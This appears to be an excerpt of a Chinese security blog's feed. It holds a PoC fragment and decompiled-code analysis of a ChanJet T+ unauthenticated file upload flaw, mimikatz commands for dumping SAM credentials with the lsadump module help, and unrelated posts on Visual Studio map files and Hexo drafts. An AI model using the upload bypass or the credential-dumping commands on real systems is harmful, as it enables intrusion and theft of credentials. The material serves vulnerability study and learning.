class="string">&#x27;target is not vulnerable&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_shell</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;target is not vulnerable&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">register_poc(ChanJetPOC)</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>分析内容参考了其他作者的内容，仅学习记录，供参考。</p><p>前提环境，请求的 Params 中 <code>preload</code> 设置为 <code>1</code> 的目的是为了跳过登录认证，这个参数在畅捷通未登录情况下不能少。</p><p>漏洞位置为 upload 相关接口。在畅捷通环境下查看相关文件：</p><ul><li>TPlusStd\WebSite\SM\SetupAccount\upload.aspx：预编译文件，无实际内容，查看相关编译文件</li><li>\TPlusStd\WebSite\bin\upload.aspx.9475d17f.compiled：upload 相关逻辑预编译文件，指明了产物及编译所需的文件，内容如下所示：<img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508163306577.png" class="" title="image-20240508163306577"></li><li>查看编译产物 <code>App_Web_upload.aspx.9475d17f.dll</code>，通过 dnSpy 查看 dll 内容。<img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508163613153.png" class="" title="image-20240508163613153"></li></ul><p>dnSpy 反编译的 <code>Page_Load</code> 函数内容如下所示：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Token: 0x06000004 RID: 4 RVA: 0x000020AC File Offset: 0x000002AC</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">Page_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.ReadResources();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Request.Files.Count == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> text = <span class="string">&quot;images/index.gif&quot;</span>;</span><br><span class="line"><span class="built_in">object</span> obj = <span class="keyword">this</span>.ViewState[<span class="string">&quot;fileName&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (obj != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">text = obj.ToString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.File1.PostedFile.ContentLength &gt; <span class="number">204800</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Response.Write(<span class="built_in">string</span>.Concat(<span class="keyword">new</span> <span class="built_in">string</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;</span>,</span><br><span class="line"><span class="keyword">this</span>.PhotoTooLarge,</span><br><span class="line"><span class="string">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;</span>,</span><br><span class="line">text,</span><br><span class="line"><span class="string">&quot;&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">&#125;));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.File1.PostedFile.ContentType != <span class="string">&quot;image/jpeg&quot;</span> &amp;&amp; <span class="keyword">this</span>.File1.PostedFile.ContentType != <span class="string">&quot;image/bmp&quot;</span> &amp;&amp; <span class="keyword">this</span>.File1.PostedFile.ContentType != <span class="string">&quot;image/gif&quot;</span> &amp;&amp; <span class="keyword">this</span>.File1.PostedFile.ContentType != <span class="string">&quot;image/pjpeg&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Response.Write(<span class="built_in">string</span>.Concat(<span class="keyword">new</span> <span class="built_in">string</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;</span>,</span><br><span class="line"><span class="keyword">this</span>.PhotoTypeError,</span><br><span class="line"><span class="string">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;</span>,</span><br><span class="line">text,</span><br><span class="line"><span class="string">&quot;&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">&#125;));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> fileName = <span class="keyword">this</span>.File1.PostedFile.FileName;</span><br><span class="line"><span class="built_in">string</span> text2 = fileName.Substring(fileName.LastIndexOf(<span class="string">&#x27;\\&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">this</span>.File1.PostedFile.SaveAs(<span class="keyword">base</span>.Server.MapPath(<span class="string">&quot;.&quot;</span>) + <span class="string">&quot;\\images\\&quot;</span> + text2);</span><br><span class="line"><span class="built_in">string</span> <span class="keyword">value</span> = <span class="keyword">base</span>.Server.MapPath(<span class="string">&quot;.&quot;</span>) + <span class="string">&quot;\\images\\&quot;</span> + text2;</span><br><span class="line"><span class="keyword">this</span>.ViewState[<span class="string">&quot;fileName&quot;</span>] = <span class="string">&quot;images/&quot;</span> + text2;</span><br><span class="line"><span class="keyword">this</span>.Session[<span class="string">&quot;ImageName&quot;</span>] = <span class="keyword">value</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数的大致逻辑就是检查参数的 Content-Type 和文件大小（小于 200 KB），检查通过的话函数会继续往下执行。在 接口请求时已经修改过上传文件的 Content-Type 了，并且文件的大小也符合条件。条件允许范围内，任意后缀文件都可以上传。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508165803074.png" class="" title="Postman修改 Content-Type 参数"><p>附加到畅捷通进程调试截图如下所示：</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508165637602.png" class="" title="Page_Load 函数"><p>可以看到上图这里已经保存了上传的文件。</p><blockquote><p>补充：补充一下 <code>preload</code> 参数的校验逻辑</p><ol><li>找一下 App_Web_upload.aspx.9475d17f 依赖的dll<style>.oujdudkpxbxh{zoom:50%;}</style><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508170419783.png" class="oujdudkpxbxh" alt="image-20240508170419783"><style>.natqhtlekwtu{zoom:50%;}</style><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508170614728.png" class="natqhtlekwtu" alt="image-20240508170614728"></li><li>查找和登录鉴权相关的接口<img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508170855132.png" class="" title="image-20240508170855132"></li><li>判断条件如下所示，当 flag 或者是以下所示的请求路径时，才会走到最终的请求，否则会在当前这个函数（<code>Application_PreRequestHandlerExecute</code>）处理请求<img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CNVD-2022-60632%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ATPlus%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240508171359323.png" class="" title="image-20240508171359323"></li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：CNVD-2022-60632 畅捷通 T+ 任意文件上传漏洞&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="畅捷通" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"/>
    
    
  </entry>
  
  <entry>
    <title>mimikatz</title>
    <link href="http://example.com/C_OpenSource/mimikatz/"/>
    <id>http://example.com/C_OpenSource/mimikatz/</id>
    <published>2024-05-06T16:00:00.000Z</published>
    <updated>2024-05-07T02:41:58.812Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：mimikatz 项目使用及解析</p></blockquote><span id="more"></span><h2 id="lsadump"><a href="#lsadump" class="headerlink" title="lsadump"></a>lsadump</h2><h3 id="命令帮助"><a href="#命令帮助" class="headerlink" title="命令帮助"></a>命令帮助</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># 提权</span><br><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 读取<span class="title">sam</span></span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">sam</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查看帮助手册</span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span> # <span class="title">lsadump</span>::</span></span><br><span class="line"><span class="function"><span class="title">ERROR</span> <span class="title">mimikatz_doLocal</span> ; &quot;(<span class="title">null</span>)&quot; <span class="title">command</span> <span class="title">of</span> &quot;<span class="title">lsadump</span>&quot; <span class="title">module</span> <span class="title">not</span> <span class="title">found</span> !</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Module</span> :        <span class="title">lsadump</span></span></span><br><span class="line"><span class="function"><span class="title">Full</span> <span class="title">name</span> :     <span class="title">LsaDump</span> <span class="title">module</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">             <span class="title">sam</span>  -  <span class="title">Get</span> <span class="title">the</span> <span class="title">SysKey</span> <span class="title">to</span> <span class="title">decrypt</span> <span class="title">SAM</span> <span class="title">entries</span> (<span class="title">from</span> <span class="title">registry</span> <span class="title">or</span> <span class="title">hives</span>)</span></span><br><span class="line"><span class="function">         <span class="title">secrets</span>  -  <span class="title">Get</span> <span class="title">the</span> <span class="title">SysKey</span> <span class="title">to</span> <span class="title">decrypt</span> <span class="title">SECRETS</span> <span class="title">entries</span> (<span class="title">from</span> <span class="title">registry</span> <span class="title">or</span> <span class="title">hives</span>)</span></span><br><span class="line"><span class="function">           <span class="title">cache</span>  -  <span class="title">Get</span> <span class="title">the</span> <span class="title">SysKey</span> <span class="title">to</span> <span class="title">decrypt</span> <span class="title">NL</span>$<span class="title">KM</span> <span class="title">then</span> <span class="title">MSCache</span>(<span class="title">v2</span>) (<span class="title">from</span> <span class="title">registry</span> <span class="title">or</span> <span class="title">hives</span>)</span></span><br><span class="line"><span class="function">             <span class="title">lsa</span>  -  <span class="title">Ask</span> <span class="title">LSA</span> <span class="title">Server</span> <span class="title">to</span> <span class="title">retrieve</span> <span class="title">SAM</span>/<span class="title">AD</span> <span class="title">entries</span> (<span class="title">normal</span>, <span class="title">patch</span> <span class="title">on</span> <span class="title">the</span> <span class="title">fly</span> <span class="title">or</span> <span class="title">inject</span>)</span></span><br><span class="line"><span class="function">           <span class="title">trust</span>  -  <span class="title">Ask</span> <span class="title">LSA</span> <span class="title">Server</span> <span class="title">to</span> <span class="title">retrieve</span> <span class="title">Trust</span> <span class="title">Auth</span> <span class="title">Information</span> (<span class="title">normal</span> <span class="title">or</span> <span class="title">patch</span> <span class="title">on</span> <span class="title">the</span> <span class="title">fly</span>)</span></span><br><span class="line"><span class="function">      <span class="title">backupkeys</span></span></span><br><span class="line"><span class="function">          <span class="title">rpdata</span></span></span><br><span class="line"><span class="function">          <span class="title">dcsync</span>  -  <span class="title">Ask</span> <span class="title">a</span> <span class="title">DC</span> <span class="title">to</span> <span class="title">synchronize</span> <span class="title">an</span> <span class="title">object</span></span></span><br><span class="line"><span class="function">        <span class="title">dcshadow</span>  -  <span class="title">They</span> <span class="title">told</span> <span class="title">me</span> <span class="title">I</span> <span class="title">could</span> <span class="title">be</span> <span class="title">anything</span> <span class="title">I</span> <span class="title">wanted</span>, <span class="title">so</span> <span class="title">I</span> <span class="title">became</span> <span class="title">a</span> <span class="title">domain</span> <span class="title">controller</span></span></span><br><span class="line"><span class="function">         <span class="title">setntlm</span>  -  <span class="title">Ask</span> <span class="title">a</span> <span class="title">server</span> <span class="title">to</span> <span class="title">set</span> <span class="title">a</span> <span class="title">new</span> <span class="title">password</span>/<span class="title">ntlm</span> <span class="title">for</span> <span class="title">one</span> <span class="title">user</span></span></span><br><span class="line"><span class="function">      <span class="title">changentlm</span>  -  <span class="title">Ask</span> <span class="title">a</span> <span class="title">server</span> <span class="title">to</span> <span class="title">set</span> <span class="title">a</span> <span class="title">new</span> <span class="title">password</span>/<span class="title">ntlm</span> <span class="title">for</span> <span class="title">one</span> <span class="title">user</span></span></span><br><span class="line"><span class="function">         <span class="title">netsync</span>  -  <span class="title">Ask</span> <span class="title">a</span> <span class="title">DC</span> <span class="title">to</span> <span class="title">send</span> <span class="title">current</span> <span class="title">and</span> <span class="title">previous</span> <span class="title">NTLM</span> <span class="title">hash</span> <span class="title">of</span> <span class="title">DC</span>/<span class="title">SRV</span>/<span class="title">WKS</span></span></span><br><span class="line"><span class="function">        <span class="title">packages</span></span></span><br><span class="line"><span class="function">             <span class="title">mbc</span></span></span><br><span class="line"><span class="function">       <span class="title">zerologon</span></span></span><br><span class="line"><span class="function">   <span class="title">postzerologon</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：mimikatz 项目使用及解析&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="C_OpenSource" scheme="http://example.com/categories/C-OpenSource/"/>
    
    
    <category term="OpenSource" scheme="http://example.com/tags/OpenSource/"/>
    
    <category term="mimikatz" scheme="http://example.com/tags/mimikatz/"/>
    
  </entry>
  
  <entry>
    <title>【Visual Studio】查看符号导入信息</title>
    <link href="http://example.com/A_OS/Windows/Visual%20Studio/%E3%80%90Visual%20Studio%E3%80%91%E6%9F%A5%E7%9C%8B%E7%AC%A6%E5%8F%B7%E5%AF%BC%E5%85%A5%E4%BF%A1%E6%81%AF/"/>
    <id>http://example.com/A_OS/Windows/Visual%20Studio/%E3%80%90Visual%20Studio%E3%80%91%E6%9F%A5%E7%9C%8B%E7%AC%A6%E5%8F%B7%E5%AF%BC%E5%85%A5%E4%BF%A1%E6%81%AF/</id>
    <published>2024-04-23T16:00:00.000Z</published>
    <updated>2024-04-29T06:44:36.001Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：通过 map 文件查看引入的函数都是从哪个文件导入的</p></blockquote><span id="more"></span><h2 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01 问题描述"></a>0x01 问题描述</h2><p>两个项目引入了同样的 lib 文件，一个编译没问题，但是另外一个编译报错链接错误，遇到这样的问题你该怎么办？</p><blockquote><p>：可以使用编程成功工程的 map 文件查看函数是通过哪个 lib 被链接到目标文件的</p></blockquote><h2 id="0x02-配置生成-map"><a href="#0x02-配置生成-map" class="headerlink" title="0x02 配置生成 map"></a>0x02 配置生成 map</h2><p>步骤一：关闭增量链接</p><img src="/A_OS/Windows/Visual%20Studio/%E3%80%90Visual%20Studio%E3%80%91%E6%9F%A5%E7%9C%8B%E7%AC%A6%E5%8F%B7%E5%AF%BC%E5%85%A5%E4%BF%A1%E6%81%AF/image-20240424164444699.png" class="" title="image-20240424164444699"><p>步骤二：开启生成映射文件并设置映射文件名</p><img src="/A_OS/Windows/Visual%20Studio/%E3%80%90Visual%20Studio%E3%80%91%E6%9F%A5%E7%9C%8B%E7%AC%A6%E5%8F%B7%E5%AF%BC%E5%85%A5%E4%BF%A1%E6%81%AF/image-20240424164602943.png" class="" title="image-20240424164602943"><p>配置完成之后编译工程就能生成 map 文件了。</p><p>可以查看 map 文件查看导入函数的一些信息。</p><h2 id="0x03-map-分析示例"><a href="#0x03-map-分析示例" class="headerlink" title="0x03 map 分析示例"></a>0x03 map 分析示例</h2><p>一段 map 文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0001:00237500       _crc32@12                  10238500 f   zlibstat_VC2017_x86_MTd:crc32.obj</span><br><span class="line"> 0001:00237520       _crc32_z@12                10238520 f   zlibstat_VC2017_x86_MTd:crc32.obj</span><br><span class="line"> 0001:00237770       _crc32_combine@12          10238770 f   zlibstat_VC2017_x86_MTd:crc32.obj</span><br><span class="line"> 0001:00237790       _get_crc_table@0           10238790 f   zlibstat_VC2017_x86_MTd:crc32.obj</span><br><span class="line"> 0001:00238470       _crc32_combine64@16        10239470 f   zlibstat_VC2017_x86_MTd:crc32.obj</span><br><span class="line"> 0001:00238490       _deflate@8                 10239490 f   zlibstat_VC2017_x86_MTd:deflate.obj</span><br><span class="line"> 0001:002394b0       _deflateEnd@4              1023a4b0 f   zlibstat_VC2017_x86_MTd:deflate.obj</span><br><span class="line"> 0001:002395c0       _deflateSetDictionary@12   1023a5c0 f   zlibstat_VC2017_x86_MTd:deflate.obj</span><br><span class="line"> 0001:00239830       _deflateGetDictionary@12   1023a830 f   zlibstat_VC2017_x86_MTd:deflate.obj</span><br><span class="line"> 0001:002398d0       _deflateCopy@8             1023a8d0 f   zlibstat_VC2017_x86_MTd:deflate.obj</span><br></pre></td></tr></table></figure><p>解析：</p><p>这段内容来自于一个 <code>.map</code> 文件，它是链接器在编译和链接过程结束后生成的，包含了程序中符号的地址、类型和一些其他信息。这个特定的 <code>.map</code> 文件片段列出了与 zlib 压缩库相关的一些函数。以下是对这些条目的分析：</p><ol><li><p>每一列的具体含义可能因编译器和链接器的不同而略有不同，但通常包括：</p><ul><li><strong>地址</strong>：符号在内存中的地址。</li><li><strong>装饰后的名称</strong>：C++ 编译器可能会对函数名称进行装饰，以包含关于函数签名的信息。</li><li><strong>原始名称</strong>：如果装饰后的名称存在，原始名称也会被列出。</li><li><strong>大小</strong>：符号的大小（通常是函数的代码大小）。</li><li><strong>段</strong>：符号所在的内存段。</li><li><strong>文件名</strong>：符号定义的源文件。</li></ul></li><li><p><code>_crc32@12</code>、<code>_crc32_z@12</code>、<code>_crc32_combine@12</code>、<code>_crc32_combine64@16</code>：这些是 CRC32 校验函数的不同版本，<code>@12</code> 和 <code>@16</code> 表示函数的参数大小（以字节为单位）。CRC32 是一种常用的数据校验算法。</p></li><li><p><code>_get_crc_table@0</code>：这个函数可能返回一个 CRC32 表的指针，该表用于优化 CRC32 计算。</p></li><li><p><code>_deflate@8</code>、<code>_deflateEnd@4</code>、<code>_deflateSetDictionary@12</code>、<code>_deflateGetDictionary@12</code>、<code>_deflateCopy@8</code>：这些函数是 zlib 压缩库中用于数据压缩的不同函数。<code>_deflate@8</code> 是压缩数据的主要函数，而 <code>_deflateEnd@4</code> 用于清理压缩流。<code>_deflateSetDictionary@12</code> 和 <code>_deflateGetDictionary@12</code> 用于设置和获取压缩字典，这可以提高压缩效率。<code>_deflateCopy@8</code> 可能用于复制压缩流的状态。</p></li><li><p>每个函数后面的 <code>f</code> 可能表示这些符号是文件（file）级别的，即它们是可执行文件或库文件的一部分，而不是导入的。</p></li><li><p><code>zlibstat_VC2017_x86_MTd:crc32.obj</code> 和 <code>zlibstat_VC2017_x86_MTd:deflate.obj</code> 表示这些符号分别来自 <code>crc32.obj</code> 和 <code>deflate.obj</code> 对象文件，这些对象文件是 <code>zlibstat_VC2017_x86_MTd</code> 项目或解决方案的一部分。<code>VC2017_x86_MTd</code> 可能表示这是用 Visual Studio 2017 编译的，针对 x86 平台，使用了多线程（MT）调试（d）配置。</p></li></ol><p>通过分析 <code>.map</code> 文件，开发者可以更好地理解程序的内存布局和符号信息，这对于调试和性能分析非常有用。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：通过 map 文件查看引入的函数都是从哪个文件导入的&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_OS" scheme="http://example.com/categories/A-OS/"/>
    
    <category term="Windows" scheme="http://example.com/categories/A-OS/Windows/"/>
    
    <category term="Visual Studio" scheme="http://example.com/categories/A-OS/Windows/Visual-Studio/"/>
    
    
    <category term="Visual Studio" scheme="http://example.com/tags/Visual-Studio/"/>
    
  </entry>
  
  <entry>
    <title>【手册】Hexo draft 使用</title>
    <link href="http://example.com/E_%E6%89%8B%E5%86%8C/%E3%80%90%E6%89%8B%E5%86%8C%E3%80%91Hexo%20draft%20%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/E_%E6%89%8B%E5%86%8C/%E3%80%90%E6%89%8B%E5%86%8C%E3%80%91Hexo%20draft%20%E4%BD%BF%E7%94%A8/</id>
    <published>2024-04-22T16:00:00.000Z</published>
    <updated>2024-04-23T03:18:55.360Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：Hexo 使用草稿箱</p></blockquote><span id="more"></span><h3 id="创建草稿"><a href="#创建草稿" class="headerlink" title="创建草稿"></a>创建草稿</h3><p>创建草稿需要使用 draft 布局，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new draft &quot;Draft Demo&quot;</span><br><span class="line">INFO  Created: ~/VScode/blog/source/_drafts/Draft-Demo.md</span><br></pre></td></tr></table></figure><h3 id="预览草稿"><a href="#预览草稿" class="headerlink" title="预览草稿"></a>预览草稿</h3><p>默认情况下，草稿不会显示在页面中，如果想要显示可以在站点配置文件 _config.yml 中把 render_drafts 参数设为 true 来预览草稿。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_drafts: true</span><br></pre></td></tr></table></figure><p>或者在启动服务器时加上 <code>--draft</code> 参数来预览草稿</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server --draft</span><br></pre></td></tr></table></figure><h3 id="发布草稿"><a href="#发布草稿" class="headerlink" title="发布草稿"></a>发布草稿</h3><p>将草稿文件发布到 _posts 文件夹下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo publish post Draft-Demo</span><br><span class="line">INFO  Published: ~/VScode/blog/source/_posts/Draft-Demo.md</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：Hexo 使用草稿箱&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="E_手册" scheme="http://example.com/categories/E-%E6%89%8B%E5%86%8C/"/>
    
    
  </entry>
  
  <entry>
    <title>【POC】POC 索引</title>
    <link href="http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90POC%E3%80%91POC%20%E7%B4%A2%E5%BC%95/"/>
    <id>http://example.com/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E3%80%90POC%E3%80%91POC%20%E7%B4%A2%E5%BC%95/</id>
    <published>2024-04-17T16:00:00.000Z</published>
    <updated>2024-05-11T09:52:35.931Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：POC 引路</p></blockquote><span id="more"></span><p><strong>免责声明：本文所涉及的信息安全技术知识仅供参考</strong>和学习之用，并不构成任何明示或暗示的保证。读者在使用本文提供的信息时，应自行判断其适用性，并承担由此产生的一切风险和责任。本文作者对于读者基于本文内容所做出的任何行为或决定不承担任何责任。在任何情况下，本文作者不对因使用本文内容而导致的任何直接、间接、特殊或后果性损失承担责任。<strong>读者在使用本文内容时应当遵守当地法律法规，并保证不违反任何相关法律法规。</strong></p><p>[toc]</p><h2 id="已整理"><a href="#已整理" class="headerlink" title="已整理"></a>已整理</h2><h3 id="畅捷通"><a href="#畅捷通" class="headerlink" title="畅捷通"></a>畅捷通</h3><h4 id="CVE-2021-23758-畅捷通反序列化"><a href="#CVE-2021-23758-畅捷通反序列化" class="headerlink" title="CVE-2021-23758 畅捷通反序列化"></a>CVE-2021-23758 畅捷通反序列化</h4><a href="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90CVE-2021-23758%E3%80%91Ajax.NET_Professional_%E4%B8%AD%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/" title="【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞">【CVE-2021-23758】Ajax .NET Professional 中的 RCE 漏洞</a><h4 id="QVD-2021-13612-畅捷通SQL注入"><a href="#QVD-2021-13612-畅捷通SQL注入" class="headerlink" title="QVD-2021-13612 畅捷通SQL注入"></a>QVD-2021-13612 畅捷通SQL注入</h4><a 